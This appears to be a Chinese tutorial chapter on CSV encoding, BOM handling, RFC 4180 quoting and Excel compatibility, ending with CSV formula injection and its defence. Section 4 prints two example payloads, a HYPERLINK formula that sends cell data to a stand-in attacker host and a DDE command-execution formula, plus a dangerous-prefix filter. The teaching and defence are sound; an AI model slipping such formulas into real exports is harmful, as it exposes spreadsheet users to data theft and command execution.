CSV 的两个大坑都发生在"字符"层面：一个是**编码**，决定中文能不能正确显示；另一个是**引号**，决定字段里的逗号、换行、引号会不会把表格撑破。再往深一层，用户可控的字段还可能变成 Excel 里的公式，带来安全风险。本篇把这三件事讲透。

# 1. 编码

## 1.1 为什么编码会出问题

CSV 是纯文本，文本在磁盘上是字节，字节要按某种规则映射成字符，这个规则就是编码。同一个字节序列，用不同编码解释会得到完全不同的字符：

```text
中文字符 "中"
┌──────────────────────────────────────┐
│ UTF-8：  E4 B8 AD   （3 字节）        │
│ GBK：    D6 D0      （2 字节）        │
└──────────────────────────────────────┘
```

用 UTF-8 去读 GBK 文件，会得到 `�` 或乱码；用 GBK 去读 UTF-8 文件，同样会错位。**CSV 文件本身不声明编码**，这是万恶之源。

| 编码 | 常见来源 | 特点 |
|------|----------|------|
| UTF-8 | 现代系统、Linux、Go、Web | 变长，ASCII 兼容 |
| GBK / GB18030 | 中文 Windows、老 Excel | 中文占 2 字节 |
| UTF-16 | Windows 部分导出、Excel 另存 | 带 BOM，字节序问题 |
| Latin-1 | 欧洲老系统 | 单字节，无法表示中文 |

★ **关键认知**：**编码错误不会在打开文件时报错，只会在显示或解析时变成乱码或异常**。所以跨系统交换 CSV 时，第一件事是确认编码，并在约定里写死。

## 1.2 BOM 是什么

BOM（Byte Order Mark）是文件开头的一段特殊字节，用来标识编码：

| 编码 | BOM 字节 |
|------|----------|
| UTF-8 | `EF BB BF`（即 `\ufeff`） |
| UTF-16 LE | `FF FE` |
| UTF-16 BE | `FE FF` |

BOM 的本意是帮助识别编码，但在 CSV 上它带来一个具体麻烦：**第一个列名会带上不可见字符**。

```text
文件内容（十六进制）：
EF BB BF 69 64 2C 6E 61 6D 65 0A ...
   BOM    i  d  ,  n  a  m  e  \n

按 UTF-8 读取后：
第一列名 = "\ufeffid"
```

于是 `df["id"]` 取不到列，报 `KeyError`；或者你的程序按 `id` 匹配表头时莫名其妙失败。

```python
# 错误现象
df = pd.read_csv("export.csv", encoding="utf-8")
print(df.columns[0])   # '\ufeffid'，肉眼看不出来

# 正确做法：用 utf-8-sig 自动剥离 BOM
df = pd.read_csv("export.csv", encoding="utf-8-sig")

# 标准库同理
with open("export.csv", newline="", encoding="utf-8-sig") as f:
    ...
```

★ **关键认知**：`utf-8-sig` 读取时会**自动跳过**开头的 BOM，写入时会**自动添加** BOM。读 Excel 导出的文件用 `utf-8-sig` 最稳；写文件给 Excel 看也用 `utf-8-sig`。

## 1.3 编码探测与转换

不知道编码时，可以用 `charset-normalizer` 或 `chardet` 探测：

```python
from charset_normalizer import from_path

result = from_path("unknown.csv").best()
print(result.encoding)      # 例如 'gb18030'
text = str(result)          # 已解码的文本
```

转换编码用 `iconv` 或 Python：

```bash
# 把 GBK 转成 UTF-8
iconv -f GBK -t UTF-8 input.csv > output.csv
```

```python
with open("input.csv", encoding="gbk") as src, \
     open("output.csv", "w", encoding="utf-8-sig", newline="") as dst:
    for chunk in src:
        dst.write(chunk)
```

⚠ 探测有概率猜错，尤其是短文件。**探测结果只作为提示，正式处理仍要人工确认**，并在日志里记录实际使用的编码。

# 2. 引号规则

## 2.1 什么时候必须加引号

RFC 4180 规定：字段含**逗号、双引号、换行**时，必须用双引号包裹。有些实现还会对前后空格、空字符串加引号，但不是必须的。

```text
普通字段：       alice
含逗号：         "hello, world"
含双引号：       "she said ""hi"""
含换行：         "line1
line2"
空字段：         （两个逗号之间什么都没有）
```

★ **关键认知**：**引号是字段边界的一部分，不是内容**。解析器看到开引号后，会把逗号、换行都当普通字符，直到遇到"不成对的"闭引号。手写解析最容易在这里出错。

## 2.2 双引号转义

字段内部的双引号用**两个双引号**表示：

```text
原始值：  she said "hi"
CSV 中：  "she said ""hi"""
解析后：  she said "hi"
```

```python
import csv
from io import StringIO

# 写入：库会自动加倍引号
buf = StringIO()
csv.writer(buf).writerow(["she said \"hi\""])
print(repr(buf.getvalue()))   # '"she said ""hi"""\r\n'

# 读取：库会自动还原
print(next(csv.reader(StringIO(buf.getvalue()))))   # ['she said "hi"']
```

⚠ 有些老系统用反斜杠转义（`\"`），这与 RFC 4180 不兼容。遇到这类文件，需要给解析器配置 `escapechar="\\"`，或先做预处理。

## 2.3 引号内的逗号与换行

```text
id,note
1,"a,b"
2,"line1
line2"
```

这两条记录在**文本上**分别是两行和三行，但在**逻辑上**只有两条记录。任何按行切分的处理（`readlines()`、`split("\n")`）都会把它切坏。

★ **关键认知**：**CSV 的行不等于文本的行**。只要字段里有换行，一条记录就跨越多个物理行。这就是为什么大文件处理也必须用 CSV 解析器，而不能简单按 `\n` 切。

# 3. Excel 兼容

## 3.1 中文乱码

Excel 在 Windows 上默认按系统编码（中文环境是 GBK）打开 CSV，遇到 UTF-8 无 BOM 文件就会乱码。

| 方案 | 做法 | 适用 |
|------|------|------|
| 加 BOM | 用 `utf-8-sig` 写 | 最通用，Excel 能识别 |
| 改后缀 | 另存为 `.txt` 再手动导入 | 临时方案 |
| 用 Excel 导入向导 | 手动选 UTF-8 | 一次性操作 |

```python
df.to_csv("report.csv", index=False, encoding="utf-8-sig")
```

## 3.2 前导零与长数字

Excel 会把看起来像数字的内容自动转换：

| 原始值 | Excel 显示 | 问题 |
|--------|------------|------|
| `00123` | `123` | 前导零丢失 |
| `13800138000` | `1.38E+10` | 变科学计数法 |
| `1234567890123456789` | `1.23457E+18` | 精度丢失 |
| `2026-01-01` | 日期序列号 | 变成日期格式 |

这些转换发生在**打开文件时**，不是 CSV 本身的问题。给用户的文件可以这样缓解：

- 写出时给敏感列加前缀制表符或单引号，Excel 会按文本处理。
- 或直接提供 `.xlsx`，在 Excel 内部明确设置单元格为文本格式。

```python
# 给电话号码、ID 加前缀，避免 Excel 转数字
df["phone"] = "\t" + df["phone"].astype(str)
```

⚠ 前缀会进入文件内容，程序再读回来时要记得去掉。这不是无损方案，只是给"人看"的妥协。

## 3.3 sep= 指令

Excel 支持在文件第一行写 `sep=;`，强制指定分隔符：

```text
sep=;
name;price
apple;3,14
```

这行不是标准 CSV，其他解析器会把它当数据。**只有在明确面向 Excel 时才用**，并且读取方要跳过第一行。

## 3.4 换行符

Excel 导出的 CSV 通常用 CRLF。Python 文本模式读入时会统一成 `\n`，但如果你用二进制处理，要自己处理 `\r\n`。写入时用 `newline=""` 让 `csv` 模块自己决定。

# 4. CSV 注入

## 4.1 原理

CSV 注入（Formula Injection）指：**用户可控的字段以 `=`、`+`、`-`、`@` 开头，被 Excel 当作公式执行**。

```text
用户输入：  =1+1
CSV 内容：  id,name
            1,=1+1
```

Excel 打开后会把 `=1+1` 当公式计算。更危险的是：

```text
=HYPERLINK("http://evil.example/"&A1,"click")
=cmd|' /C calc'!A0
```

前者可以外带数据，后者在旧版 Excel 配合 DDE 时甚至能执行命令。虽然现代 Excel 默认拦截 DDE，但风险仍然存在。

★ **关键认知**：**CSV 注入的根源是"数据被当成了代码"**，和 SQL 注入同源。防御思路也一样：**不要相信用户输入，输出时对危险前缀做转义**。

## 4.2 防御

最直接的做法是：对以危险字符开头的字段，加一个单引号前缀，让 Excel 按文本处理。

```python
DANGEROUS = ("=", "+", "-", "@", "\t", "\r")

def sanitize_cell(value: str) -> str:
    if value and value[0] in DANGEROUS:
        return "'" + value      # 单引号让 Excel 当文本
    return value

safe_rows = [
    [sanitize_cell(cell) for cell in row]
    for row in rows
]
```

更稳妥的组合策略：

| 措施 | 作用 |
|------|------|
| 前缀转义 | 阻止公式解析 |
| 白名单校验 | 只允许预期字符 |
| 输出为 xlsx 并设文本格式 | 从格式层面禁用公式 |
| 不直接导出用户输入 | 减少攻击面 |
| 导出后扫描危险前缀 | 兜底检测 |

⚠ 前缀单引号在 Excel 里不可见，但会进入文件内容。如果文件还要被其他程序读，需在读取端剥离，否则值会变成 `'=1+1`。这是"显示安全"与"数据纯净"之间的取舍，要按用途选择。

# 5. 常见错误

| 错误 | 现象 | 解决 |
|------|------|------|
| 用 UTF-8 读 GBK | 中文乱码 | 探测或显式指定编码 |
| 忽略 BOM | 第一列名带 `\ufeff` | 用 `utf-8-sig` |
| 手写引号转义 | 含引号字段解析错 | 交给 `csv`/专业库 |
| 按 `\n` 切行 | 引号内换行被切断 | 用 CSV 解析器 |
| 导出给 Excel 不加 BOM | 中文乱码 | `encoding="utf-8-sig"` |
| 直接导出用户输入 | 公式注入 | 危险前缀转义 |
| 用反斜杠转义 | 与 RFC 不兼容 | 统一用 `""` |

# 6. 练习

1. 造一个含中文、逗号、双引号、换行的字段，分别用 `csv.writer` 写入再读回，验证内容完全一致。
2. 用 UTF-8 和 GBK 各读一次同一个含中文的 CSV，记录两种结果，并解释为什么会乱码。
3. 写一个 `sanitize_cell` 函数，把以 `=`、`+`、`-`、`@` 开头的字段变成 Excel 安全文本，并说明为什么不能只过滤 `=`。

# 7. 小结

| 主题 | 要点 |
|------|------|
| 编码 | 读写前先确认，跨系统必须写进约定 |
| BOM | 读用 `utf-8-sig`，写给人看也用 `utf-8-sig` |
| 引号 | 逗号、引号、换行必须包裹，内部引号用 `""` |
| 行与记录 | 引号内换行让一条记录跨多个物理行 |
| Excel | BOM 解决乱码，前缀解决前导零和长数字 |
| 注入 | 危险前缀转义 + 白名单 + 不直接导出 |

下一篇进入大文件与流式处理，讲清为什么"读进内存"会炸、如何逐行与分块、压缩文件的限制，以及并行处理的边界。
